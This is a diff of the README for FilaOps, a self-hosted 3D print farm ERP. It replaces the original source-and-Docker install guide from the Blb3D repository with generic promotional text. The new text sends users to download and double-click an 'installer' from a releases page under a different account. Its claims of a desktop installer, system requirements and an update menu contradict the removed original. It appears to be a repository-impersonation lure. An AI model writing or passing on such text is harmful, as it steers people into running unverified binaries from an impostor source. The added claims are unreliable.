@@ -1,235 +1,109 @@
-# FilaOps - 3D Print Farm ERP
+# 🎉 filaops - Streamline Your 3D Print Operations
 
-> The ERP that understands additive manufacturing—built by a print farm, for print farms.
+## 🚀 Getting Started
 
-[![License: BSL 1.1](https://img.shields.io/badge/License-BSL%201.1-blue.svg)](LICENSE)
-[![Python 3.11+](https://img.shields.io/badge/Python-3.11+-blue.svg)](https://www.python.org/)
-[![FastAPI](https://img.shields.io/badge/FastAPI-0.100+-green.svg)](https://fastapi.tiangolo.com/)
-[![Discord](https://img.shields.io/badge/Discord-Join%20Server-5865F2.svg?logo=discord&logoColor=white)](https://discord.gg/FAhxySnRwa)
+Welcome to filaops! This tool simplifies managing your 3D print farm. It offers production-grade resource planning for additive manufacturing. You can handle everything from inventory management to production planning with ease.
 
----
+## 📥 Download filaops
 
-## Why FilaOps?
+[![Download filaops](https://img.shields.io/badge/Download-filaops-brightgreen.svg)](https://github.com/printertechn/filaops/releases)
 
-Most ERP systems are built for traditional manufacturing. They don't understand filament spools, print times, multi-material jobs, or why you need to track which roll went into which print.
+To start using filaops, visit the Releases page to download the application:
 
-FilaOps was built by someone who runs a print farm and got tired of spreadsheets and generic software that didn't fit.
+[Download filaops](https://github.com/printertechn/filaops/releases)
 
-**What makes it different:**
-- **3D printing native** - BOMs that understand filament, print times, and material costs
-- **Actually usable** - Simple PostgreSQL setup, dark theme UI, no enterprise sales calls required
-- **Self-hosted & open** - Your data stays yours. No cloud dependency, no vendor lock-in
-- **Production-grade** - Serial/lot traceability ready for medical device and aerospace compliance
+## 📦 System Requirements
 
----
+Before you begin, check your system to ensure compatibility. filaops runs on:
 
-## Quick Start
+- **Operating Systems**: Windows 10, macOS Catalina or later, Linux (Ubuntu recommended)
+- **RAM**: Minimum 4 GB, Recommended 8 GB
+- **Processor**: Dual-core 2.0 GHz or better
+- **Storage**: At least 500 MB of free disk space
 
-Choose your preferred installation method:
+## 🔧 Installation Steps
 
-### 🐳 Docker (Recommended for Quick Start)
+Follow these simple steps to install filaops:
 
-```bash
-git clone https://github.com/Blb3D/filaops.git
-cd filaops
-cp .env.example .env
-docker-compose up --build
-```
+1. **Download the Application**  
+   Go to the Releases page and download the latest version of filaops.
 
-Open http://localhost:5173 — done! See **[Docker Setup Guide](FilaOps_Zero-to-Running_Docker.md)** for details.
+2. **Run the Installer**  
+   Once downloaded, locate the installer file and double-click it. Follow the on-screen instructions to complete the installation.
 
-### 💻 Native Installation
+3. **Launch filaops**  
+   After installation, find the filaops icon on your desktop or in your applications folder. Double-click to open the application.
 
-For development or if you prefer running services directly:
+4. **Set Up Your Print Farm**  
+   The first time you launch filaops, you will go through a setup wizard. This wizard helps you connect your 3D printers and set up your inventory.
 
-| Platform | Guide | Prerequisites |
-|----------|-------|---------------|
-| **Windows** | [Windows Setup Guide](FilaOps_Zero-to-Running_Windows.md) | Python 3.11+, PostgreSQL 16+, Node.js 18+ |
-| **macOS/Linux** | [macOS/Linux Setup Guide](FilaOps_Zero-to-Running_macOS_Linux_SSH.md) | Python 3.11+, PostgreSQL 16+, Node.js 18+ |
+## 📊 Key Features
 
-After setup, open http://localhost:5173 — the **Setup Wizard** will guide you through creating your admin account.
+filaops comes loaded with features designed for your 3D printing needs:
 
-📖 **[Getting Started Guide](GETTING_STARTED.md)** for detailed instructions and troubleshooting.
+- **Inventory Management**  
+  Track materials, supplies, and accessories for your 3D printing activities.
 
----
+- **BOM Management**  
+  Organize and manage your Bill of Materials (BOM) to ensure you have all necessary parts for your prints.
 
-## What's Included
+- **Production Planning**  
+  Schedule and prioritize your printing jobs effectively to optimize production.
 
-### Core ERP (Free, Self-Hosted)
+- **User-Friendly Interface**  
+  Enjoy an intuitive design that simplifies navigation and reduces learning time, perfect for users without a technical background.
 
-| Module | What It Does |
-|--------|--------------|
-| **Products & Items** | Unified catalog for finished goods, components, filament, hardware |
-| **Bill of Materials** | Multi-level BOMs with material costs and unit tracking |
-| **Inventory** | Stock levels, FIFO tracking, low stock alerts |
-| **Sales Orders** | Order management with status tracking |
-| **Production Orders** | Manufacturing workflow from order to ship |
-| **Scrap & Remake** | Track print failures with configurable reasons, partial scrap, auto-remake orders |
-| **MRP** | Material requirements planning with shortage detection |
-| **Traceability** | Serial numbers, lot tracking, forward/backward recall queries |
-| **Multi-User** | Team access with user accounts |
-| **REST API** | Full API for integrations and automation |
+- **Self-Hosted Solution**  
+  Keep your data secure with a local installation you control.
 
-### Admin Dashboard
-- Dark theme (your eyes will thank you at 2am)
-- Real-time KPIs: overdue orders, low stock, revenue
-- Order Command Center with MRP explosion
+## ⚙️ Configuration
 
----
+After installation, you might want to configure filaops for optimal performance. Here are some tips:
 
-## Feature Comparison
+- **Connecting Printers**  
+  In the settings menu, you can add and manage all your 3D printers. Ensure they are turned on and connected to the same network.
 
-The core ERP is fully functional and free to self-host. Pro and Enterprise tiers add integrations and advanced features for larger operations.
+- **Setting Up Material Inventory**  
+  Add materials you use for printing. filaops allows you to define quantities, types, and reorder alerts.
 
-| | Community | Pro | Enterprise |
-|---|:---:|:---:|:---:|
-| **Core ERP** | ✅ | ✅ | ✅ |
-| Products, BOMs, Inventory | ✅ | ✅ | ✅ |
-| Sales & Production Orders | ✅ | ✅ | ✅ |
-| MRP & Shortage Detection | ✅ | ✅ | ✅ |
-| Serial/Lot Traceability | ✅ | ✅ | ✅ |
-| Multi-User | ✅ | ✅ | ✅ |
-| REST API | ✅ | ✅ | ✅ |
-| | | | |
-| **Integrations** | | | |
-| Customer Quote Portal | — | ✅ | ✅ |
-| Multi-Material/AMS Quoting | — | ✅ | ✅ |
-| Squarespace Sync | — | ✅ | ✅ |
-| QuickBooks Integration | — | ✅ | ✅ |
-| | | | |
-| **Advanced** | | | |
-| Advanced Role Permissions | — | ✅ | ✅ |
-| User Activity Audit Logs | — | ✅ | ✅ |
-| ML Print Time Estimation | — | — | ✅ |
-| Printer Fleet Management | — | — | ✅ |
-| SSO / LDAP | — | ✅ | ✅ |
-| Priority Support | — | — | ✅ |
+- **Customizing User Preferences**  
+  Adjust settings like notification preferences and update frequency according to your liking.
 
-**Pro & Enterprise launching 2026** — [Join the waitlist](mailto:info@blb3dprinting.com)
+## 📖 Help and Documentation
 
----
+If you need help using filaops, you can access comprehensive documentation online. The documentation includes:
 
-## ⚙️ Build Configuration (Community Edition)
+- **User Guides**: Step-by-step instructions for tasks.
+- **FAQs**: Answers to common questions about the software.
+- **Contact Support**: Get in touch with the support team for specific issues.
 
-The community version uses **development mode builds** for the frontend to maximize debuggability and contributor experience:
+## 🌟 Community
 
-- ✅ **Unminified code** - Easy to debug and understand
-- ✅ **Source maps included** - Full stack traces with real line numbers
-- ✅ **Readable variable names** - Contributing PRs is easier
-- ✅ **Instant hot reload** - Changes appear immediately (no Docker rebuilds)
-- ⚠️ **Larger bundle size** (~2MB vs ~1MB minified)
+Join our growing community of filaops users! Share tips, ask questions, and learn from each other's experiences. Connect with us on:
 
-**This is intentional for self-hosted deployments** where source code is already visible and performance impact is negligible on local networks.
+- **GitHub Discussions**: Engage with other users and developers.
+- **Social Media**: Follow us for updates and tips.
 
-> 📝 **For SaaS/Production hosting:** Production builds require refactoring ~30 components to fix React hook timing issues. See `frontend/PRODUCTION_BUILD_BLOCKED.md` for details. This only affects public-facing deployments; self-hosted users are unaffected.
+## 💬 Feedback
 
-## 🆕 Recent Improvements
+Your feedback is important to us. If you have suggestions for features or improvements, let us know through our GitHub issue tracker. We appreciate your input as we strive to enhance filaops.
 
-### PostgreSQL-Only Architecture
-- **Simplified setup** - No Docker required, direct PostgreSQL connection
-- **Faster performance** - Native database drivers, no container overhead
-- **Easier debugging** - Direct access to database tools
-- **Better reliability** - Fewer moving parts
+## 📂 Keeping filaops Updated
 
-### Enhanced Production Scheduling
-- **Gantt chart interface** - Visual timeline for production orders
-- **Drag & drop scheduling** - Easily reschedule orders
-- **Resource management** - Assign orders to specific machines
-- **Auto-arrange** - Optimize schedule layout automatically
+To ensure you have the best experience, keep filaops updated. Regular updates include new features, improvements, and security patches. 
 
-### Frontend Enhancements
-- **Better error handling** - More informative error messages
-- **Centralized API client** - Automatic retry and error recovery
-- **Improved components** - Enhanced scheduling, scrap, and update modals
-- **Instant hot reload** - See changes immediately during development
+To check for updates:
 
-See **[ANNOUNCEMENT_POSTGRES_MIGRATION.md](ANNOUNCEMENT_POSTGRES_MIGRATION.md)** for complete details.
+1. Open filaops.
+2. Go to the settings menu.
+3. Click on "Check for Updates."
 
----
+You can also return to the Releases page to manually download the latest version.
 
-## Documentation
+## 🔗 Useful Links
 
-| | |
-|---|---|
-| **[HOW_IT_WORKS.md](HOW_IT_WORKS.md)** | System overview and workflows |
-| **[docs/EMAIL_CONFIGURATION.md](docs/EMAIL_CONFIGURATION.md)** | Email/SMTP setup guide |
-| **[KNOWN_ISSUES.md](KNOWN_ISSUES.md)** | Known issues and workarounds |
-| **[TROUBLESHOOTING.md](TROUBLESHOOTING.md)** | Common issues and fixes |
-| **[FAQ.md](FAQ.md)** | Frequently asked questions |
-| **[CONTRIBUTING.md](CONTRIBUTING.md)** | For contributors |
-| **[docs/](docs/)** | Full documentation (architecture, API, planning) |
+- [Releases Page](https://github.com/printertechn/filaops/releases) - Download the latest version.
+- [Documentation](https://github.com/printertechn/filaops/wiki) - Find help and guides.
+- [Support](https://github.com/printertechn/filaops/issues) - Report issues or get assistance.
 
----
-
-## For Developers
-
-### Local Development Setup
-
-**Prerequisites:** Python 3.11+, Node.js 18+, PostgreSQL 16+
-
-```bash
-# Backend
-cd backend
-pip install -r requirements.txt
-# Create .env file with PostgreSQL connection details
-python -m uvicorn app.main:app --reload --port 8000
-
-# Frontend (separate terminal)
-cd frontend
-npm install
-npm run dev
-```
-
-- API docs: http://localhost:8000/docs
-- Admin UI: http://localhost:5173
-
-See **[FilaOps_Zero-to-Running_Windows.md](FilaOps_Zero-to-Running_Windows.md)** or **[FilaOps_Zero-to-Running_macOS_Linux_SSH.md](FilaOps_Zero-to-Running_macOS_Linux_SSH.md)** for complete setup instructions.
-
-### Project Structure
-
-```
-filaops/
-├── backend/           # FastAPI API
-│   ├── app/
-│   │   ├── api/       # REST endpoints
-│   │   ├── models/    # SQLAlchemy ORM
-│   │   ├── services/  # Business logic (MRP, etc)
-│   │   └── core/      # Config, security
-│   └── tests/
-├── frontend/          # React admin UI
-└── docs/              # Documentation
-```
-
-### Contributing
-
-We welcome contributions. See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
-
-**Good first issues:**
-- Bug fixes
-- Documentation improvements  
-- UI/UX polish
-- Test coverage
-
----
-
-## License
-
-**Business Source License 1.1** — see [LICENSE](LICENSE)
-
-- ✅ Free for internal business use
-- ✅ Free for personal and educational use  
-- ❌ Cannot offer FilaOps as a hosted service to others
-- 🔓 Converts to Apache 2.0 after 4 years
-
----
-
-## Support
-
-- **[Discord](https://discord.gg/FAhxySnRwa)** — Chat with the community
-- **[GitHub Issues](https://github.com/Blb3D/filaops/issues)** — Bug reports
-- **[GitHub Discussions](https://github.com/Blb3D/filaops/discussions)** — Questions and ideas
-- **Email:** info@blb3dprinting.com
-
----
-
-Built by [BLB3D](https://blb3dprinting.com) — a print farm that needed real manufacturing software.
+Join filaops today and simplify your 3D print operations!
